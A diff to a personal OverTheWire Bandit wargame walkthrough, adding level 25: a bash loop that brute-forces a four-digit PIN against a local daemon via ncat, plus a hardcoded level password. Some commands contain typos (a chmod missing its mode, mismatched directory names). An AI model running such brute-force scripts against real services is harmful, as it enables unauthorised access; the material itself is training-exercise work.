@@ -173,6 +173,31 @@ $ ll # make sure bandit24.sh is executable
 $ cd ~
 $ cp /tmp/mydirb24/bandit24.sh /var/spool/bandit24/foo/script.sh # cp my script into the cron time-based job scheduler wait 60s
 $ cat cat /tmp/mydir24/password # password will show.
-
-
 ```
+
+25.A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time
+
+```bash
+$ mkdir  /tmp/BandiT25
+$ chmod /tmp/BandiT25
+$ cd /tmp/BanditT25
+$ nano bandit25.sh
+#!/bin/bash
+
+for char in  {0..9}{0..9}{0..9}{0..9}; do
+
+echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $char" | ncat localhost 30002 |  egrep -v  "Exiting|Wrong|I am"
+
+# egrep → searches for text/patterns(allows for piping under quotes )
+#-v → reverses the search; hides matching lines.
+#"Exiting|Wrong|I am" → patterns to hide.
+#| → means OR.
+
+echo "Wrong Pin: $char "
+
+done
+
+
+$ chmod +x bandit25.sh
+$ ./bandit25.sh
